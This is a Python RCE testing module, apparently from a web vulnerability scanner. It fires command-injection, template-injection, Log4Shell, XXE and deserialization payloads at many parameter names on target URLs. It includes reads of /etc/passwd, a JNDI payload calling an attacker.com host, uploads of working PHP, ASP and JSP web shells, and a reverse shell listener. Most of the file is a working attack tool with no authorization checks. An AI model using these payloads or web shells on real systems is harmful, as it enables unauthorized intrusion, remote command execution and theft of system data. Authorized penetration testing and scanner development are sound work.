#!/usr/bin/env python3
"""
RCE (Remote Code Execution) Testing Module
Tests for command injection and code execution vulnerabilities
"""

import requests
import time
import re
import subprocess
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import urllib.parse
import base64

class RCETester:
    def __init__(self, timeout=15, level='normal'):
        self.timeout = timeout
        self.level = level
        self.vulnerabilities = []
        
        # Basic command injection payloads
        self.basic_payloads = [
            # Command separators
            '; echo "RCE_TEST"', '| echo "RCE_TEST"', '&& echo "RCE_TEST"',
            '|| echo "RCE_TEST"', '`echo "RCE_TEST"`', '$(echo "RCE_TEST")',
            
            # System information commands
            '; whoami', '| whoami', '&& whoami', '|| whoami', '`whoami`', '$(whoami)',
            '; id', '| id', '&& id', '|| id', '`id`', '$(id)',
            '; pwd', '| pwd', '&& pwd', '|| pwd', '`pwd`', '$(pwd)',
            
            # File system commands
            '; ls', '| ls', '&& ls', '|| ls', '`ls`', '$(ls)',
            '; dir', '| dir', '&& dir', '|| dir', '`dir`', '$(dir)',  # Windows
            '; cat /etc/passwd', '| cat /etc/passwd', '&& cat /etc/passwd',
            
            # Time-based detection
            '; sleep 5', '| sleep 5', '&& sleep 5', '|| sleep 5',
            '`sleep 5`', '$(sleep 5)', '; ping -c 4 127.0.0.1',
            
            # Windows equivalents
            '; timeout 5', '&& timeout /t 5', '|| ping -n 5 127.0.0.1',
        ]
        
        # Advanced RCE payloads for moderate/extreme levels
        self.advanced_payloads = [
            # Code injection (various languages)
            # PHP
            "<?php echo 'RCE_TEST'; ?>", "<?=`whoami`?>", "<?php system('whoami'); ?>",
            "'; system('whoami'); //", "\"; system('whoami'); //",
            
            # Python
            "__import__('os').system('whoami')", "eval('__import__(\"os\").system(\"whoami\")')",
            "exec('import os; os.system(\"whoami\")')", "'; import os; os.system('whoami'); #",
            
            # Node.js / JavaScript
            "require('child_process').exec('whoami')", "'; require('child_process').exec('whoami'); //",
            "process.mainModule.require('child_process').exec('whoami')",
            
            # Java
            "Runtime.getRuntime().exec('whoami')", "'; Runtime.getRuntime().exec('whoami'); //",
            
            # Ruby
            "`whoami`", "system('whoami')", "'; system('whoami'); #",
            "exec('whoami')", "'; exec('whoami'); #",
            
            # Perl
            "system('whoami')", "'; system('whoami'); #", "`whoami`",
            "exec('whoami')", "'; exec('whoami'); #",
            
            # Template injection
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",  # Flask/Jinja2
            "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",  # Spring
            "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "<%=`whoami`%>",  # ERB
            
            # Expression Language injection
            "${pageContext.request.getSession().getServletContext().getResource('/etc/passwd').getContent()}",
            "#{request.getSession().getServletContext().getRealPath('/etc/passwd')}",
            
            # LDAP injection leading to RCE
            "*)(&(objectClass=*)(cn=*))(|(cn=*", "*)))(|(objectClass=*))",
            
            # XXE leading to RCE
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            
            # Deserialization attacks
            "O:8:\"stdClass\":0:{}", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAACaGl0AANBQUZ4",
            
            # Log4j / Log4Shell
            "${jndi:ldap://127.0.0.1:1389/evil}", "${jndi:dns://attacker.com}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/evil}",
            
            # Server-side includes
            "<!--#exec cmd=\"whoami\"-->", "<!--#include file=\"/etc/passwd\"-->",
            
            # ASP/ASP.NET
            "<%= CreateObject(\"WScript.Shell\").Exec(\"whoami\").StdOut.ReadAll %>",
            "<%eval request(\"cmd\")%>", "Response.Write(Server.CreateObject(\"WScript.Shell\").Exec(\"whoami\").StdOut.ReadAll)",
            
            # Cold Fusion
            "<cfexecute name=\"whoami\" outputfile=\"output.txt\">", "#CreateObject(\"java\",\"java.lang.Runtime\").getRuntime().exec(\"whoami\")#",
            
            # File inclusion leading to RCE
            "data://text/plain;base64," + base64.b64encode(b"<?php system('whoami'); ?>").decode(),
            "expect://whoami", "input://whoami",
            
            # Bypass techniques
            "w'h'o'a'm'i", "w\\ho\\am\\i", "who$()ami", "/b??/wh??mi",
            "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",  # base64 encoded: cat /etc/passwd
            
            # Polyglot payloads
            "';sleep(5);#", "\";sleep(5);#", "';setTimeout(function(){},5000);#",
        ]
        
        # RCE indicators in response
        self.rce_indicators = [
            # Command output indicators
            'root:', 'bin:', 'daemon:', 'www-data:', 'apache:', 'nginx:',  # /etc/passwd
            'uid=', 'gid=', 'groups=',  # id command
            'total ', '-rw-r--r--', 'drwxr-xr-x',  # ls -la output
            'Directory of', 'Volume Serial Number',  # Windows dir
            '/home/', '/usr/', '/var/', '/tmp/', '/etc/',  # Unix paths
            'C:\\', 'D:\\', 'Program Files', 'Windows',  # Windows paths
            
            # Error messages that might indicate RCE
            'command not found', 'No such file or directory', 'Permission denied',
            "'whoami' is not recognized", "sh: can't open", "bash: command not found",
            
            # Language-specific indicators
            'Parse error', 'Fatal error', 'Warning:', 'Notice:',  # PHP
            'Traceback', 'NameError', 'SyntaxError',  # Python
            'ReferenceError', 'TypeError', 'SyntaxError',  # JavaScript
            'Exception in thread', 'java.lang.',  # Java
            'undefined method', 'wrong number of arguments',  # Ruby
        ]
    
    def start_reverse_shell_listener(self, port=4444):
        """Start a reverse shell listener to catch connections"""
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind(('0.0.0.0', port))
            listener.listen(1)
            listener.settimeout(30)  # 30 second timeout
            
            print(f"{Fore.CYAN}[*] Reverse shell listener started on port {port}{Style.RESET_ALL}")
            
            try:
                conn, addr = listener.accept()
                print(f"{Fore.GREEN}[+] Reverse shell connection from {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                conn.close()
                listener.close()
                return True
            except socket.timeout:
                listener.close()
                return False
        except Exception:
            return False
    
    def test_parameter_rce(self, url, param, method='GET'):
        """Test a specific parameter for RCE"""
        results = []
        
        payloads_to_test = self.basic_payloads.copy()
        if self.level in ['moderate', 'extreme']:
            payloads_to_test.extend(self.advanced_payloads)
        
        for payload in payloads_to_test:
            try:
                start_time = time.time()
                
                if method.upper() == 'GET':
                    test_params = {param: payload}
                    response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                else:
                    test_data = {param: payload}
                    response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                
                response_time = time.time() - start_time
                
                # Check for RCE indicators in response
                for indicator in self.rce_indicators:
                    if indicator.lower() in response.text.lower():
                        vuln = {
                            'type': 'Remote Code Execution (RCE)',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': method,
                            'evidence': f"RCE indicator found: {indicator}",
                            'response_length': len(response.text),
                            'status_code': response.status_code,
                            'response_time': response_time
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] RCE found: {url} (param: {param}) - {indicator}{Style.RESET_ALL}")
                        break
                
                # Check for time-based RCE (sleep/delay commands)
                if any(sleep_cmd in payload.lower() for sleep_cmd in ['sleep', 'timeout', 'ping']):
                    if response_time >= 4:  # If response takes 4+ seconds
                        vuln = {
                            'type': 'Time-based RCE',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': method,
                            'evidence': f"Response delay indicates command execution: {response_time:.2f}s",
                            'response_time': response_time,
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] Time-based RCE found: {url} (param: {param}){Style.RESET_ALL}")
                
                # Check for specific command outputs
                if 'RCE_TEST' in response.text:
                    vuln = {
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': method,
                        'evidence': "Command injection confirmed - test string found in response",
                        'response_length': len(response.text),
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"{Fore.RED}[!] Command Injection confirmed: {url} (param: {param}){Style.RESET_ALL}")
                
                time.sleep(0.2)  # Delay between requests
                
            except requests.exceptions.Timeout:
                # Timeout might indicate successful command execution
                if any(sleep_cmd in payload.lower() for sleep_cmd in ['sleep', 'timeout', 'ping']):
                    vuln = {
                        'type': 'Potential Time-based RCE (Timeout)',
                        'severity': 'High',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': method,
                        'evidence': "Request timed out, possible command execution",
                        'response_time': self.timeout
                    }
                    results.append(vuln)
                    print(f"{Fore.YELLOW}[!] Potential RCE (timeout): {url}{Style.RESET_ALL}")
            except Exception:
                continue
        
        return results
    
    def test_file_upload_rce(self, url):
        """Test for RCE through file upload"""
        results = []
        
        # PHP shell content
        php_shell = b"<?php if(isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); } ?>"
        
        # ASP shell content  
        asp_shell = b"<%eval request(\"cmd\")%>"
        
        # JSP shell content
        jsp_shell = b"<%@ page import=\"java.io.*\" %><%String cmd = request.getParameter(\"cmd\");Process p = Runtime.getRuntime().exec(cmd);InputStream is = p.getInputStream();int i;while((i=is.read())!=-1) out.write(i);%>"
        
        shells = [
            ('shell.php', php_shell, 'text/x-php'),
            ('shell.asp', asp_shell, 'text/x-asp'),
            ('shell.jsp', jsp_shell, 'text/x-jsp'),
            ('shell.txt', php_shell, 'text/plain'),  # Sometimes .txt files are executed as PHP
        ]
        
        for filename, content, content_type in shells:
            try:
                files = {'file': (filename, content, content_type)}
                response = requests.post(url, files=files, timeout=self.timeout, verify=False)
                
                # Check if upload was successful
                if response.status_code == 200 and 'success' in response.text.lower():
                    vuln = {
                        'type': 'Potential RCE via File Upload',
                        'severity': 'Critical',
                        'url': url,
                        'filename': filename,
                        'evidence': f"File upload successful, potential web shell: {filename}",
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"{Fore.RED}[!] Potential file upload RCE: {url} ({filename}){Style.RESET_ALL}")
                
            except Exception:
                continue
        
        return results
    
    def test_rce(self, targets):
        """Main RCE testing function"""
        print(f"{Fore.YELLOW}[*] Starting RCE testing...{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        # Start reverse shell listener in background (extreme mode only)
        if self.level == 'extreme':
            listener_thread = threading.Thread(target=self.start_reverse_shell_listener)
            listener_thread.daemon = True
            listener_thread.start()
        
        for target in targets:
            url = target.get('url', target.get('subdomain', ''))
            if not url.startswith('http'):
                url = f"http://{url}"
            
            print(f"{Fore.CYAN}[*] Testing RCE: {url}{Style.RESET_ALL}")
            
            # Parameters commonly vulnerable to RCE
            rce_params = ['cmd', 'command', 'exec', 'execute', 'system', 'shell', 'run',
                         'do', 'make', 'process', 'call', 'invoke', 'eval', 'code',
                         'script', 'function', 'method', 'action', 'operation',
                         'file', 'path', 'dir', 'directory', 'folder', 'location',
                         'url', 'uri', 'link', 'src', 'source', 'include', 'require',
                         'input', 'data', 'content', 'text', 'value', 'param']
            
            for param in rce_params:
                vulns = self.test_parameter_rce(url, param, 'GET')
                all_vulnerabilities.extend(vulns)
                
                # Test POST for critical parameters
                if param in ['cmd', 'command', 'exec', 'code', 'eval']:
                    vulns = self.test_parameter_rce(url, param, 'POST')
                    all_vulnerabilities.extend(vulns)
            
            # Test file upload endpoints
            if self.level in ['moderate', 'extreme']:
                if any(indicator in url.lower() for indicator in ['upload', 'file', 'attach', 'media']):
                    upload_vulns = self.test_file_upload_rce(url)
                    all_vulnerabilities.extend(upload_vulns)
        
        self.vulnerabilities = all_vulnerabilities
        return all_vulnerabilities